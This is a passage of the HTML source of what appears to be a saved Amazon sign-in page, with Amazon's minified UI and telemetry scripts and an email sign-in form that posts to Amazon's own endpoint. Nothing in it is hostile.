(function(c){var a=c.ue;a.cv={};a.cv.scopes={};a.count=function(d,c,b){var e={},f=a.cv,g=b&&0===b.c;e.counter=d;e.value=c;e.t=a.d();b&&b.scope&&(f=a.cv.scopes[b.scope]=a.cv.scopes[b.scope]||{},e.scope=b.scope);if(void 0===c)return f[d];f[d]=c;d=0;b&&b.bf&&(d=1);ue_csm.ue_sclog||!a.clog||0!==d||g?a.log&&a.log(e,"csmcount",{c:1,bf:d}):a.clog(e,"csmcount",{bf:d})};a.count("baselineCounter2",1);a&&a.event&&(a.event({requestId:c.ue_id||"rid",server:c.ue_sn||"sn",obfuscatedMarketplaceId:c.ue_mid||"mid"},
"csm","csm.CSMBaselineEvent.4"),a.count("nexusBaselineCounter",1,{bf:1}))})(ue_csm);



var ue_hoe = +new Date();
}
window.ueinit = window.ue_ihb;
</script>

<!-- tqstjjgcu7 --><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8">
    <title dir="ltr">Amazon Sign-In</title>

    
      

      
        <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61Brdu0o6LL._RC|11Fd9tJOdtL.css,21y5jWQoUML.css,31Q3id-QR0L.css,31P8A7PnBZL.css_.css?AUIClients/AmazonUI#us.not-trident">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|419sIPk+mYL.css,41+ENBGOqUL.css_.css?AUIClients/AuthenticationPortalAssets">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11E08O3eXDL.css?AUIClients/CVFAssets">
<script>
(function(f,h,Q,A){function G(a){v&&v.tag&&v.tag(q(":","aui",a))}function x(a,b){v&&v.count&&v.count("aui:"+a,0===b?0:b||(v.count("aui:"+a)||0)+1)}function l(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function y(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function H(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function ta(a,b){var c=a.length,
e=c,g=function(){e--||(R.push(b),S||(setTimeout(T,0),S=!0))};for(g();c--;)ca[a[c]]?g():(B[a[c]]=B[a[c]]||[]).push(g)}function ua(a,b,c,e,g){var d=h.createElement(a?"script":"link");y(d,"error",e);g&&y(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function da(a,b){function c(c,e){function g(){ua(b,c,h,function(b){!I&&h?(h=!1,x("resource_retry"),
g()):(x("resource_error"),a.log("Asset failed to load: "+c,I?"WARN":A));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(ea[c])return!1;ea[c]=!0;x("resource_count");var h=!0;return!g()}if(b){var e=0,g=0;c.andConfirm=function(a,b){return c(a,function(){e++;b&&b.apply(this,arguments)})};c.confirm=function(){g++};c.getCsriCounters=function(){return{reqs:e,full:g}}}return c}function va(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},logError:function(c,
d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)J.hasOwnProperty(c[d])&&(g[d]=U.hasOwnProperty(c[d])?U[c[d]](J[c[d]],e):J[c[d]]);return g}function C(a,b,c,e,g){return function(d,h){function m(){var a=null;e?a=h:"function"===typeof h&&(p.start=D(),a=h.apply(f,va(d,k,l)),p.end=D());if(b){J[d]=a;a=d;for(ca[a]=!0;(B[a]||[]).length;)B[a].shift()();delete B[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=A);b&&(d=d?d.replace(fa,""):"__NONAME__",V.hasOwnProperty(d)&&k.error(q(", reregistered by ",
q(" by ",d+" already registered",V[d]),k.attribution),d),V[d]=k.attribution);for(var l=[],n=0;n<a.length;n++)l[n]=a[n].replace(fa,"");var p=ga[d||"anon"+ ++wa]={depend:l,registered:D(),namespace:k.namespace};c?m():ta(l,k.guardFatal(d,m));return{decorate:function(a){U[d]=k.guardFatal(d,a)}}}}function ha(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:C(b,!1,a,!1,this),register:C(b,!0,a,!1,this)}}}function W(a,b){return function(c,e){e||(e=c,c=A);var g=this.attribution;
return function(){z.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);z.pop();return d}}}function K(a,b){this.load={js:da(this,!0),css:da(this)};H(this,"namespace",b);H(this,"attribution",a)}function ia(){h.body?p.trigger("a-bodyBegin"):setTimeout(ia,20)}function E(a,b){a.className=X(a,b)+" "+b}function X(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function ja(a){try{return a()}catch(b){return!1}}function L(){if(M){var a={w:f.innerWidth||
m.clientWidth,h:f.innerHeight||m.clientHeight};5<Math.abs(a.w-Y.w)||50<a.h-Y.h?(Y=a,N=4,(a=k.mobile||k.tablet?450<a.w&&a.w>a.h:1250<=a.w)?E(m,"a-ws"):m.className=X(m,"a-ws")):0<N&&(N--,ka=setTimeout(L,16))}}function xa(a){(M=a===A?!M:!!a)&&L()}function ya(){return M}function r(a,b){return"sw:"+(b||"")+":"+a+":"}function la(){ma.forEach(function(a){G(a)})}function n(a){ma.push(a)}function na(a,b,c,e){if(c){b=l(/Chrome/i)&&!l(/Edge/i)&&!l(/OPR/i)&&!a.capabilities.isAmazonApp&&!l(new RegExp(Z+"bwv"+
Z+"b"));var g=r(e,"browser"),d=r(e,"prod_mshop"),f=r(e,"beta_mshop");!a.capabilities.isAmazonApp&&c.browser&&b&&(n(g+"supported"),c.browser.action(g,e));!b&&c.browser&&n(g+"unsupported");c.prodMshop&&n(d+"unsupported");c.betaMshop&&n(f+"unsupported")}}"use strict";var O=Q.now=Q.now||function(){return+new Q},D=function(a){return a&&a.now?a.now.bind(a):O}(f.performance),za=D(),t=f.AmazonUIPageJS||f.P;if(t&&t.when&&t.register)throw Error("A copy of P has already been loaded on this page.");var v=f.ue;
G();G("aui_build_date:3.19.8-2020-11-06");var R=[],S=!1,T;T=function(){for(var a=setTimeout(T,0),b=O();R.length;)if(R.shift()(),50<O()-b)return;clearTimeout(a);S=!1};var ca={},B={},ea={},I=!1;y(f,"beforeunload",function(){I=!0;setTimeout(function(){I=!1},1E4)});var fa=/^prv:/,V={},J={},U={},ga={},wa=0,Z=String.fromCharCode(92),F,z=[],oa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(Z,g.message,"at "+q(":",b,c,e)):A);var d=z.pop()||
{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&console&&console.log&&console.log([g.logLevel||"ERROR",a,"thrown by",g.attribution].join(" "));z=[];oa&&(d=[].slice.call(arguments),d[4]=g,oa.apply(f,d))};K.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,
b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:W(),guardFatal:W("FATAL"),guardCurrent:function(a){var b=z[z.length-1];return b?W(b.logLevel,b).call(this,a):a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:C([],!0,!0,!0),register:C([],!0),execute:C([]),AUI_BUILD_DATE:"3.19.8-2020-11-06",when:ha(),now:ha(!0),trigger:function(a,b,c){var e=O();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&F.when("prv:a-logTrigger").execute(function(b){b(a)})},
handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new K(a)},_namespace:function(a,b){return new K(a,b)}};var p=H(f,"AmazonUIPageJS",new K);F=p._namespace("PageJS","AmazonUI");F.declare("prv:p-debug",ga);p.declare("p-recorder-events",[]);p.declare("p-recorder-stop",function(){});H(f,"P",p);ia();if(h.addEventListener){var pa;h.addEventListener("DOMContentLoaded",pa=function(){p.trigger("a-domready");h.removeEventListener("DOMContentLoaded",pa,!1)},!1)}var m=
h.documentElement,aa=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){b.style.cssText="background-image:-webkit-gradient(linear,left top,right bottom,from(#1E4),to(white));background-image:-webkit-linear-gradient(left top,#1E4,white);background-image:linear-gradient(left top,#1E4,white);";return~b.style.backgroundImage.indexOf("gradient")},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===
b.style[c[e]])return!0;return!1},testTransform3d:function(){var a=!1;f.matchMedia&&(a=f.matchMedia("(-webkit-transform-3d)").matches);return a}}}(),t=m.className,qa=/(^| )a-mobile( |$)/.test(t),ra=/(^| )a-tablet( |$)/.test(t),k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg",
"svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in
h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return aa.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;x("hiRes"+(qa?"Mobile":ra?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return aa.testTransform3d()},touchScrolling:function(){return l(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},
ios:function(){return l(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!l(/trident|Edge/i)},android:function(){return l(/android.([1-9]|[L-Z])/i)&&!l(/trident|Edge/i)},mobile:function(){return qa},tablet:function(){return ra},rtl:function(){return"rtl"===m.dir}},u;for(u in k)k.hasOwnProperty(u)&&(k[u]=ja(k[u]));for(var ba="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ba.length;P++)k[ba[P]]=ja(function(){return aa.test(ba[P])});var M=!0,ka=0,
Y={w:0,h:0},N=4;L();y(f,"resize",function(){clearTimeout(ka);N=4;L()});var sa={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};m.className=X(m,"a-no-js");E(m,"a-js");!l(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||l(/safari/i)||E(m,"a-ember");t=[];for(u in k)k.hasOwnProperty(u)&&k[u]&&t.push("a-"+u.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));E(m,t.join(" "));m.setAttribute("data-aui-build-date",
"3.19.8-2020-11-06");p.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&sa,toggleResponsiveGrid:xa,responsiveGridEnabled:ya}});l(/UCBrowser/i)||k.localStorage&&E(m,sa.getItem("a-font-class"));p.declare("a-event-revised-handling",!1);var w;try{w=navigator.serviceWorker}catch(a){G("sw:nav_err")}w&&(y(w,"message",function(a){a&&a.data&&x(a.data.k,a.data.v)}),w.controller&&w.controller.postMessage("MSG-RDY"));var ma=[];(function(a){var b=a.reg,c=a.unreg;w&&w.getRegistrations?
(F.when("A","a-util").execute(function(a,b){na(a,b,c,"unregister")}),y(f,"load",function(){F.when("A","a-util").execute(function(a,c){na(a,c,b,"register");la()})})):(b&&(b.browser&&n(r("register","browser")+"unsupported"),b.prodMshop&&n(r("register","prod_mshop")+"unsupported"),b.betaMshop&&n(r("register","beta_mshop")+"unsupported")),c&&(c.browser&&n(r("unregister","browser")+"unsupported"),c.prodMshop&&n(r("unregister","prod_mshop")+"unsupported"),c.betaMshop&&n(r("unregister","beta_mshop")+"unsupported")),
la())})({reg:{},unreg:{}});p.declare("a-fix-event-off",!1);x("pagejs:pkgExecTime",D()-za)})(window,document,Date);
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11-BZEJ8lnL.js,61q-U9rAZ3L.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js?AUIClients/AmazonUI');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,21juQdw6GzL.js,21muxdgytlL.js,01jyb5ooYrL.js,51cP9CJH5-L.js_.js?AUIClients/AuthenticationPortalAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/01dTJcsqFWL.js?AUIClients/AuthenticationPortalInlineAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31AdsQdF3JL.js?AUIClients/CVFAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/81JZFvi7+TL.js?AUIClients/SiegeClientSideEncryptionAUI');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/71R0g9yuu8L.js?AUIClients/FWCIMAssets');
</script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11-BZEJ8lnL.js,61q-U9rAZ3L.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js?AUIClients/AmazonUI"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,21juQdw6GzL.js,21muxdgytlL.js,01jyb5ooYrL.js,51cP9CJH5-L.js_.js?AUIClients/AuthenticationPortalAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01dTJcsqFWL.js?AUIClients/AuthenticationPortalInlineAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/31AdsQdF3JL.js?AUIClients/CVFAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/81JZFvi7+TL.js?AUIClients/SiegeClientSideEncryptionAUI"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/71R0g9yuu8L.js?AUIClients/FWCIMAssets"></script>

      
    
  <script type="text/javascript">
window.ue_ihe = (window.ue_ihe || 0) + 1;
if (window.ue_ihe === 1) {
(function(k,l,g){function m(a){c||(c=b[a.type].id,"undefined"===typeof a.clientX?(e=a.pageX,f=a.pageY):(e=a.clientX,f=a.clientY),2!=c||h&&(h!=e||n!=f)?(r(),d.isl&&l.setTimeout(function(){p("at",d.id)},0)):(h=e,n=f,c=0))}function r(){for(var a in b)b.hasOwnProperty(a)&&d.detach(a,m,b[a].parent)}function s(){for(var a in b)b.hasOwnProperty(a)&&d.attach(a,m,b[a].parent)}function t(){var a="";!q&&c&&(q=1,a+="&ui="+c);return a}var d=k.ue,p=k.uex,q=0,c=0,h,n,e,f,b={click:{id:1,parent:g},mousemove:{id:2,
parent:g},scroll:{id:3,parent:l},keydown:{id:4,parent:g}};d&&p&&(s(),d._ui=t)})(ue_csm,window,document);



(function(s,l){function m(b,e,c){c=c||new Date(+new Date+t);c="expires="+c.toUTCString();n.cookie=b+"="+e+";"+c+";path=/"}function p(b){b+="=";for(var e=n.cookie.split(";"),c=0;c<e.length;c++){for(var a=e[c];" "==a.charAt(0);)a=a.substring(1);if(0===a.indexOf(b))return decodeURIComponent(a.substring(b.length,a.length))}return""}function q(b,e,c){if(!e)return b;-1<b.indexOf("{")&&(b="");for(var a=b.split("&"),f,d=!1,h=!1,g=0;g<a.length;g++)f=a[g].split(":"),f[0]==e?(!c||d?a.splice(g,1):(f[1]=c,a[g]=
f.join(":")),h=d=!0):2>f.length&&(a.splice(g,1),h=!0);h&&(b=a.join("&"));!d&&c&&(0<b.length&&(b+="&"),b+=e+":"+c);return b}var k=s.ue||{},t=6048E7,n=ue_csm.document||l.document,r=null,d;a:{try{d=l.localStorage;break a}catch(u){}d=void 0}k.count&&k.count("csm.cookieSize",document.cookie.length);k.cookie={get:p,set:m,updateCsmHit:function(b,e,c){try{var a;if(!(a=r)){var f;a:{try{if(d&&d.getItem){f=d.getItem("csm-hit");break a}}catch(k){}f=void 0}a=f||p("csm-hit")||"{}"}a=q(a,b,e);r=a=q(a,"t",+new Date);
try{d&&d.setItem&&d.setItem("csm-hit",a)}catch(h){}m("csm-hit",a,c)}catch(g){"function"==typeof l.ueLogError&&ueLogError(Error("Cookie manager: "+g.message),{logLevel:"WARN"})}}}})(ue_csm,window);

(function(l,d){function c(b){b="";var c=a.isBFT?"b":"s",d=""+a.oid,f=""+a.lid,g=d;d!=f&&20==f.length&&(c+="a",g+="-"+f);a.tabid&&(b=a.tabid+"+");b+=c+"-"+g;b!=e&&100>b.length&&(e=b,a.cookie?a.cookie.updateCsmHit(m,b+("|"+ +new Date)):document.cookie="csm-hit="+b+("|"+ +new Date)+n+"; path=/")}function p(){e=0}function h(b){!0===d[a.pageViz.propHid]?e=0:!1===d[a.pageViz.propHid]&&c({type:"visible"})}var n="; expires="+(new Date(+new Date+6048E5)).toGMTString(),m="tb",e,a=l.ue||{},k=a.pageViz&&a.pageViz.event&&
a.pageViz.propHid;a.attach&&(a.attach("click",c),a.attach("keyup",c),k||(a.attach("focus",c),a.attach("blur",p)),k&&(a.attach(a.pageViz.event,h,d),h({})));a.aftb=1})(ue_csm,document);


ue_csm.ue.stub(ue,"impression");


ue.stub(ue,"trigger");



if(window.ue&&uet) { uet('bb'); }

}
</script></head>

  <body class="ap-locale-en_US a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate">

<script>

if (window.csa) {
    csa("Config", {
        'Application': 'Retail',
        'ObfuscatedMarketplaceId': 'ATVPDKIKX0DER',
        'Events.SushiEndpoint': 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
        'CacheDetection.RequestID': "M49R8JGG5Z1BWJV74PY6",
        'CacheDetection.Callback': window.ue && ue.reset
    });

    csa("Events")("setEntity", {
        page: {requestId: "M49R8JGG5Z1BWJV74PY6", meaningful: "interactive"},
        session: {id: "138-8036082-0992152"}
    });
}

</script>

<script type="text/javascript">

(function(){function l(a){for(var c=b.location.search.substring(1).split("&"),e=0;e<c.length;e++){var d=c[e].split("=");if(d[0]===a)return d[1]}}window.amzn=window.amzn||{};amzn.copilot=amzn.copilot||{};var b=window,f=document,g=b.P||b.AmazonUIPageJS,h=f.head||f.getElementsByTagName("head")[0],m=0,n=0;amzn.copilot.checkCoPilotSession=function(){f.cookie.match("cpidv")&&("undefined"!==typeof jQuery&&k(jQuery),g&&g.when&&g.when("jQuery").execute(function(a){k(a)}),b.amznJQ&&b.amznJQ.available&&b.amznJQ.available("jQuery",
function(){k(jQuery)}),b.jQuery||g||b.amznJQ||q())};var q=function(){m?b.ue&&"function"===typeof b.ue.count&&b.ue.count("cpJQUnavailable",1):(m=1,f.addEventListener?f.addEventListener("DOMContentLoaded",amzn.copilot.checkCoPilotSession,!1):f.attachEvent&&f.attachEvent("onreadystatechange",function(){"complete"===f.readyState&&amzn.copilot.checkCoPilotSession()}))},k=function(a){if(!n){n=1;amzn.copilot.jQuery=a;a=l("debugJS");var c="https:"===b.location.protocol?1:0,e=1;url="/gp/copilot/handlers/copilot_strings_resources.html";
window.texas&&texas.locations&&(url=texas.locations.makeUrl(url));g&&g.AUI_BUILD_DATE&&(e=0);amzn.copilot.jQuery.ajax&&amzn.copilot.jQuery.ajax({url:url,dataType:"json",data:{isDebug:a,isSecure:c,includeAUIP:e},success:function(a){amzn.copilot.vip=a.serviceEndPoint;amzn.copilot.enableMultipleTabSession=a.isFollowMe;r(a)},error:function(){b.ue.count("cpLoadResourceError",1)}})}},r=function(a){var c=amzn.copilot.jQuery,e=function(){amzn.copilot.setup(c.extend({isContinuedSession:!0},a))};a.CSSUrls&&
c.each(a.CSSUrls[0],function(a,c){var b=f.createElement("link");b.type="text/css";b.rel="stylesheet";b.href=c;h.appendChild(b)});a.CSSTag&&s(a.CSSTag);if(a.JSUrls){var d=l("forceSynchronousJS"),b=a.JSUrls[0];c.each(b,function(a,c){a===b.length-1?p(c,d,e):p(c,d)})}a.JSTag&&(t(a.JSTag),P.when("CSCoPilotPresenterAsset").execute(function(){e()}))},t=function(a){var c=f.createElement("div");c.innerHTML=a;a=0;for(var b=c.children.length;a<b;a++){var d=f.createElement("script");d.type="text/javascript";
d.innerHTML=c.children[a].innerHTML;h.appendChild(d)}},s=function(a){var b=f.createElement("div");b.innerHTML=a;a=0;for(var e=b.children.length;a<e;a++)h.appendChild(b.children[a])},p=function(a,b,e){var d=f.createElement("script");d.type="text/javascript";d.src=a;d.async=b?!1:!0;e&&(d.onload=e);h.appendChild(d)}})();

amzn.copilot.checkCoPilotSession();

</script>
<div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              





<div class="a-section a-spacing-base auth-pagelet-container">
  
    
    
      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
        <p>
          <a class="a-link-normal" href="/gp/help/customer/display.html/ref=ap_cookie_error_help?">
            
          </a>
        </p>
      </div></div></div>
    
  
</div>

<div class="a-section auth-pagelet-container">
  







<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->


<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->


<!-- show a warning modal dialog when the third party account is connected with Amazon -->



  
    





<div class="a-section a-spacing-base">
  <div class="a-section">
    
    <form name="signIn" method="post" novalidate="" action="https://www.amazon.com/ap/signin" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="BtN3Bebr">
      <input type="hidden" name="appActionToken" value="ZzD1mabm8mlbSpJsSeg7oSvkUj2Bsj3D"><input type="hidden" name="appAction" value="SIGNIN_PWD_COLLECT">
      <input type="hidden" name="subPageType" value="SignInClaimCollect">

      




  
    <input type="hidden" name="openid.return_to" value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9ncC9jc3MvaG9tZXBhZ2UuaHRtbD9pZT1VVEY4JiUyQVZlcnNpb24lMkE9MSYlMkFlbnRyaWVzJTJBPTA=">
  
    <input type="hidden" name="prevRID" value="ape:TTQ5UjhKR0c1WjFCV0pWNzRQWTY=">
  
    <input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.l6VFb8yhZBJIQ9db5NUYGuD7Uc3Udlb8hkT4Wd6tMesjcMCgSjx1mw.z8OAEUqJyneWwtuZ.oKfq1JWV2NttS6ZSWcGd0UJ-MgETBWqSg-nx6o8F1_Z0yDSaC-KCK3OqpQsYEh3CeJ_QJ1UPUIKO3KV0-TaQMWH1yvWhFkhgxYXbNTIyj0jzitvS1CpSYRbF4DTROQLAdVJ1r1cCPppm8me0sA14v3umKiPdxni1VH2w2xSjMsFVerMl_wT4xIn-WmF3kCRvBqPzzMp-d_m95QmHM4LLaC6TAm52wOeNk6j1t7XWbg9LZNvFoQdP0Flp7MHADipZwxpFSbZPLjtj6dh1xKwIUvNcQep0e-OHXPOoIZpndNli25J8PCOhWdkGSUxA_jNRDcMM0YuQ-d4lJoF2oFxIkq-gzPkq3fhO.t2EHWguI8sjxT9-v1I0nGg">
  



      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            Sign-In
          </h1>
          <!-- optional subheading element -->
          
          <div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">
              Email or mobile phone number
            </label>
            
            
              
                
              
              
            
            <input type="email" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">

            
            <input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password" class="a-input-text hide">
            



<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter your email or mobile phone number
</div></div></div>

          </div>

          
          <input type="hidden" name="create" value="0">

          <div class="a-section">
            
            









            
            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
              Continue
            </span></span></span>

            
            
              



<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
  By continuing, you agree to Amazon's <a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=508088">Conditions of Use</a> and <a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=468496">Privacy Notice</a>.
</div> 

            

            
<script>
  function cf() {
    if (typeof window.uet === 'function') {
      uet('cf');
    }
    if (window.embedNotification &&
      typeof window.embedNotification.onCF === 'function') {
      embedNotification.onCF();
    }
  }
</script>

<script type="text/javascript">cf()</script>

          </div>

          

          

          



<div class="a-section">
  <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
    <a href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
      Need help?
    </span></a>
    
      <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
        



  
  
  
    
  

<a id="auth-fpp-link-bottom" class="a-link-normal" href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%3Fie%3DUTF8%26%252AVersion%252A%3D1%26%252Aentries%252A%3D0&amp;prevRID=M49R8JGG5Z1BWJV74PY6&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
  Forgot your password?
</a>
      </div>
    
    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
      <a id="ap-other-signin-issues-link" class="a-link-normal" href="/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">
        Other issues with Sign-In
      </a>
    </div>
  </div>
</div>


          




  
  
  
    
      
      
      
        
        
      
    
  


          
          
        </div></div>
      </div>
